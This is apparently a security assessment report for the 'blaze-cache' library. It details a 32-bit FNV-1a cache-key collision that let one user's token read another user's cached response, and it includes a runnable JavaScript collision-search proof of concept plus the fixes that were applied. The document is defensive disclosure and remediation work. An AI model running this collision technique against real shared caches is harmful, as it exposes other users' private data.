# Blaze Cache — Vulnerability Assessment

**Date:** 2026-11-20
**Target:** `blaze-cache` monorepo @ `main` (`4093dda`), version `0.4.0-beta.2`
**Scope:** Rust/WASM core, TypeScript packages, CI/CD workflows, dependency tree, git history
**Authorization:** Assessment performed locally against the project's own source and build artifacts.

---

## 1. Executive summary

| Area                                       | Result                                                                            |
| ------------------------------------------ | --------------------------------------------------------------------------------- |
| Dependency vulnerabilities (RustSec / OSV) | **Clean** — `cargo audit` exit 0, `pnpm audit --audit-level high` exit 0          |
| Secrets in source / full git history       | **Clean** — no credential patterns found                                          |
| CI/CD supply-chain hardening               | **Strong** — SHA-pinned actions, checksum-pinned binaries, least-privilege tokens |
| WASM memory safety                         | **Strong** — no `unsafe` remains; raw-pointer boundary validated                  |
| Application/crypto design                  | **1 exploitable finding** — see F-01                                              |

**Overall:** The project is unusually well hardened. The only issue I could actually exploit was
F-01: the HTTP adapters used a 32-bit non-cryptographic hash as the _sole_ separator for
identity-scoped cache keys. I produced a working end-to-end exploit (two different
`Authorization` tokens resolving to one cache entry), and **it has now been fixed** — see §7.
All findings below are recorded with their current status.

---

## 2. Methodology

- SCA: `cargo audit`, `pnpm audit --audit-level high`
- Secret scan: regex sweep of working tree and every commit in `--all` history
- CI/CD review: `.github/workflows/{security,rust,js}.yml`, `dependabot.yml`, `pnpm-workspace.yaml`
- Manual code review: WASM raw-key boundary, core cache/eviction/tag logic, TS wrapper,
  all five HTTP adapter key builders, persistence layer
- Exploit development: against the **built** artifacts (`packages/core/dist`,
  `packages/fetch/dist`, `pkg/blaze_cache_wasm_bg.wasm`)

---

## 3. Findings

### F-01 — Cross-identity cache collision via 32-bit FNV-1a _(HIGH — exploited, now FIXED)_

**Affected:** `packages/{axios,fetch,ky,ofetch}/src/key.ts` — `fnv1a()` / `defaultCacheKey()`.

Each adapter appends `?${fnv1a(payload)}` to the base cache key, where `payload` contains the
values of the `vary` headers (typically `Authorization`) and/or the request body. The code
comment states the hash is "not a security primitive" and that its purpose is to keep secrets
out of persisted keys — but it is in fact the _only_ thing separating one identity's cached
response from another's.

A 32-bit hash has a birthday bound of only ~2^16 (≈65 536) inputs. FNV-1a is also algebraically
invertible mod 2^32 (multiply by the odd prime 0x01000193 and XOR are both invertible), so it
provides no preimage resistance either. Two distinct identities can therefore be made to share
one cache key.

**Evidence (real `defaultCacheKey`, first collision found in ~3M tries, <1 s):**

```
identity A (victim) : Bearer sk_live_ae70c7077724d8ba
identity B (attacker): Bearer sk_live_6b326ecd982941c8
cache key A : get /api/account?9fqk7r
cache key B : get /api/account?9fqk7r     <- identical
```

**End-to-end (real WASM `BlazeCache`):**

```
cache.set(keyA, { owner:'victim', email:'victim@corp.local', role:'admin' })
cache.get(keyB) -> {"owner":"victim","email":"victim@corp.local","role":"admin"}   (HIT)
```

**Impact:** Cross-identity cache poisoning / private-response disclosure wherever one cache
instance is shared across identities and the vary-header values (or other hashed inputs) are
attacker-influencable or otherwise enumerable. Precondition: the attacker can find a colliding
input (trivial) and can cause the victim to use one member of the pair, or can observe the
victim's persisted key. In a shared/SSR cache or same-origin IndexedDB context this is a direct
cross-tenant read; in a strictly single-user browser profile the exposure is lower.

**Remediation (implemented — see §7):** cache keys now use a 128-bit FNV-1a digest from
`@blaze-cache/core` (`cacheKeyHash`), giving a 2^64 birthday bound. The legacy 32-bit `fnv1a`
remains exported for API compatibility but is deprecated and no longer used by any key path.

---

### F-02 — "Secrets are hidden" claim is not true for short inputs _(MEDIUM — related to F-01; FIXED)_

`fnv1a()`'s documentation says its point is that "a persisted cache key never contains a secret
in readable form." Because FNV-1a is invertible, a persisted hash can be reversed step-by-step
(`h_prev = (h · prime⁻¹) ⊕ byte`) to recover any input up to ~4 bytes exactly, and to construct
preimages for longer ones. Short tokens/params written into IndexedDB are therefore recoverable
by anyone who can read that storage. Fixed with F-01: the 128-bit hash makes inversion to a
16-bit code unit infeasible, and the misleading doc comment was replaced.

---

### F-03 — WASM raw-key decoder was memory-unsafe _(CRITICAL — remediated on main)_

Historical commits `a1248b7`/`421aa1c` introduced `key_from_scratch()` using
`from_raw_parts` + `from_utf8_unchecked`, trusting host-supplied `(ptr, len)`. A stale pointer
after scratch reallocation or an oversized length gave an out-of-bounds read of WASM linear
memory; invalid UTF-8 broke `&str` invariants (UB).

Fixed in `33544fa`/`e6ea3f8` by the bounds-checked, UTF-8-validating `with_raw_key()` helper
now on `main`; regression tests added in `123a9ab` (`cover raw key failure paths`). No `unsafe`
remains in the WASM crate. **Action:** keep the regression tests; do not reintroduce unchecked
decoding when optimising the hot path.

---

### F-04 — `CacheStats::hit_rate()` integer overflow _(LOW — theoretical)_

`crates/blaze-cache-core/src/stats.rs`: `self.hits + self.misses` panics in debug builds and
wraps in release after ~2^64 lookups. Not remotely reachable in practice; noted for completeness.

---

## 4. Positive / hardened areas (verified, not just documented)

- **CI:** all third-party actions pinned to commit SHAs; downloaded binaries pinned by version
  _and_ SHA-256; `permissions: contents: read` default; nightly SCA issues via least-privilege
  token. No script-injection-prone `run:` interpolations found.
- **Dependencies:** no known advisories in either ecosystem; `follow-redirects` CVE override
  present in `pnpm-workspace.yaml`; Dependabot configured for npm/cargo/actions.
- **Prototype pollution:** `stableStringify` and all adapter key builders use `defineProperty`
  for `__proto__`; `headers.ts` repair logic preserves literal `__proto__` headers. Verified by
  the existing test suites.
- **Input validation:** capacity clamping, tag-offset clamping, NUL-safe composite keys in
  IndexedDB, generation rotation with epoch invalidation, WASM pointer validation.
- **Secrets:** none in tree or history.

---

## 5. Reproduce / verify the fix

The script below performs the exploit search itself. Build the workspace first, then run it
from the repository root with any JS runtime. It imports the shipped `dist/` build and needs
no other setup; the seeded generator makes the first collision reproducible.

```js
/**
 * Reproduce the cross-identity cache-key collision (and verify the fix).
 */
import { defaultCacheKey } from './packages/fetch/dist/key.js';

// The legacy 32-bit FNV-1a, kept only to FIND a collision — no longer used for keys.
function legacyFnv1a(input) {
  let h = 0x811c9dc5;
  for (let i = 0; i < input.length; i += 1) {
    h ^= input.charCodeAt(i);
    h = Math.imul(h, 0x01000193) >>> 0;
  }
  return h >>> 0;
}

const keyFor = (token) =>
  defaultCacheKey(
    '/api/account',
    { method: 'GET', headers: new Headers({ authorization: token }) },
    ['authorization'],
  );

// Seeded PRNG so the first collision is always the same pair.
let seed = 0x12345678;
const next = () => {
  seed = (Math.imul(seed, 1664525) + 1013904223) >>> 0;
  return seed.toString(16).padStart(8, '0');
};

// Birthday search: two DIFFERENT tokens whose legacy 32-bit hashes match.
const seen = new Map();
let pair = null;
for (let i = 0; i < 3_000_000 && pair === null; i += 1) {
  const token = 'Bearer sk_live_' + next() + next();
  const h = legacyFnv1a(JSON.stringify([token]));
  if (seen.has(h) && seen.get(h) !== token) pair = [seen.get(h), token];
  else seen.set(h, token);
}
if (pair === null) throw new Error('no collision found');

const [victim, attacker] = pair;
console.log('victim          :', victim);
console.log('attacker        :', attacker);
console.log(
  'legacy 32-bit hashes equal:',
  legacyFnv1a(JSON.stringify([victim])) === legacyFnv1a(JSON.stringify([attacker])),
);
console.log('cache key victim  :', keyFor(victim));
console.log('cache key attacker:', keyFor(attacker));
console.log('keys identical?   :', keyFor(victim) === keyFor(attacker));

// Before the fix: true — one shared entry, so the attacker's request is a HIT on
// the victim's cached response. After the fix: false — the 128-bit digest keeps
// the two identities apart.
```

---

## 6. Prioritised recommendations (status)

1. ~~**P0 — F-01:** replace 32-bit FNV-1a…~~ **DONE** — see §7.
2. ~~**P1 — F-02:** correct the security claims in `fnv1a()` docs…~~ **DONE** — the legacy helper
   is deprecated with an explicit warning; audit of other persisted fields: no other field
   relies on hashing for secrecy.
3. ~~**P2 — F-03:** retain the raw-key failure-path tests as a permanent regression gate; keep
   the crate `unsafe`-free.~~ **DONE** — see §8.
4. ~~**P3 — F-04:** use `saturating_add` in `hit_rate()` (defence in depth).~~ **DONE** — see §8.
5. ~~Consider adding an SBOM (CycloneDX/SPDX) artifact to releases.~~ **DONE** — see §8.

---

## 7. Remediation applied (F-01 / F-02)

- `packages/core/src/utils.ts`: added exported `cacheKeyHash()` — 128-bit FNV-1a over the
  input's UTF-16 code units, returning a fixed 32-character lowercase hex string. Synchronous,
  dependency-free, ~10 µs for a 200-character input (paid once per request, not per lookup).
  Chosen over Web Crypto's SHA-256 because the latter is Promise-based and would make every
  `defaultCacheKey` call async. Collision resistance comes from the 2^64 birthday bound;
  inverting a multiply step yields a 128-bit value that cannot be forced into a 16-bit code
  unit, so targeted second-preimages are infeasible.
- `packages/core/src/index.ts`: re-exports `cacheKeyHash`.
- `packages/{axios,fetch,ky,ofetch}/src/key.ts`: `defaultCacheKey()` now calls `cacheKeyHash`
  instead of the local `fnv1a`. The 32-bit `fnv1a` stays exported for API compatibility but is
  marked `@deprecated` and documented as unsafe for identity separation.
- Regression tests:
  - `packages/fetch/test/fetch.test.mjs` asserts a known 32-bit-colliding token pair (verified
    to collide under `fnv1a`) produces **different** cache keys and a 128-bit hex suffix.
  - `packages/core/test/core.test.mjs` asserts `cacheKeyHash` is deterministic, 32 hex chars,
    and separates different inputs.
- Updated hardcoded expected keys and stale comments; integration-test comment now says
  `<hash>` instead of `<fnv1a>`.

**Verification:** `pnpm test:js` — all packages pass (core 127/127, fetch 71/71, axios 49/49,
ky 66/66, ofetch 41/41, swr 49/49, react-query 39/39, integration 23/23). `pnpm typecheck` —
clean. Both exploit PoCs now report no collision/leak.

**Operational note:** the cache-key format changes (shorter base36 hash → 32 hex chars).
Persisted entries written by `0.4.0-beta.2` and earlier will not be found after upgrading and
will be evicted/re-fetched on use. That is intentional: old entries may have been written under
a collidable key.

---

## 8. Remediation applied (P2 / F-03, P3 / F-04, SBOM)

- **F-03 — permanent `unsafe` gate:** `crates/blaze-cache-wasm/src/lib.rs` now declares
  `#![forbid(unsafe_code)]`, so the bounds-checked `with_raw_key` decoder cannot regress to the
  old `from_raw_parts`/`from_utf8_unchecked` form — any `unsafe` in the crate is a compile error.
  The existing `#[wasm_bindgen_test]` cases (`raw_key_methods_round_trip_and_reject_bad_pointers`,
  `raw_key_methods_ignore_invalid_utf8_in_the_scratch`) remain as behavioural regression tests.
- **F-04 — overflow guard:** `crates/blaze-cache-core/src/stats.rs::hit_rate()` now uses
  `saturating_add`, with a unit test using `u64::MAX` counters proving the method returns a
  finite in-range value instead of panicking (debug) or wrapping (release).
- **SBOM:** `scripts/generate-sbom.mjs` (Node built-ins only, no dependencies or network)
  parses `pnpm-lock.yaml` and `Cargo.lock` and writes a CycloneDX 1.5 JSON BOM to
  `sbom.cdx.json` — currently 216 components (165 npm with SHA-512 integrity hashes,
  51 Cargo with SHA-256 checksums). Exposed as `pnpm generate:sbom`. The output is gitignored.
  `.github/workflows/sbom.yml` generates it on release publication (and manual dispatch) and
  attaches it to the GitHub release with `gh release upload --clobber`; actions are SHA-pinned
  like the rest of the workflows, and `contents: write` is scoped to that upload step's job.

**Verification:** `cargo test --workspace` — 50 core unit tests + 3 integration + 4 doctests
pass, including the new overflow test; `pnpm build:wasm` succeeds with `forbid(unsafe_code)`;
`pnpm generate:sbom` produces a valid 216-component CycloneDX document.
